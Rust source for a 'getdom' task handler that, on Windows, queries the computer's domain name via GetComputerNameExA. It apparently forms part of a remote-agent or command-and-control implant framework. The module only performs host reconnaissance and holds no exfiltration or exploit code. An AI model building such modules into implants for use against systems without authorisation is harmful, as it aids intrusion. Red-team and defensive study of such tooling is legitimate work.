use crate::internal::listener::{TaskHandler};

#[cfg(target_os = "windows")]
use winapi::{shared::minwindef::DWORD, um::sysinfoapi::GetComputerNameExA};

pub static COMMAND: &str = "getdom";
pub struct Command {}

impl TaskHandler for Command {
    fn handle(&self, _: String, args: Vec<String>) -> Result<String, Box<dyn std::error::Error>> {
        #[cfg(any(feature = "debug_assertions", feature = "debug"))]
        println!(
            "Executing command `{}` with args `{:?}`",
            COMMAND,
            args.clone()
        );

        if args.len() != 0 {
            return Ok("Invalid number of arguments received. Usage: 'getdom'.".to_string());
        }

        #[cfg(target_os = "windows")]
        {
            let domain = get_domain();

            if domain.is_empty() {
                return Ok("Computer is not domain joined.".to_string());
            }

            return Ok(get_domain());
        }

        #[cfg(not(target_os = "windows"))]
        Ok(crate::internal::tasks::unsupported::reply(COMMAND))
    }
}

#[cfg(target_os = "windows")]
fn get_domain() -> String {
    let mut buffer = [0; 0xff];
    let mut buffer_length: DWORD = buffer.len() as DWORD;

    unsafe {
        GetComputerNameExA(2, buffer.as_mut_ptr(), &mut buffer_length);
    }

    let buffer_slice: [u16; 0xff] = buffer.map(|b| b as u16);
    let len = buffer.iter().take_while(|&&c| c != 0).count();

    return String::from_utf16_lossy(&buffer_slice[..len]);
}
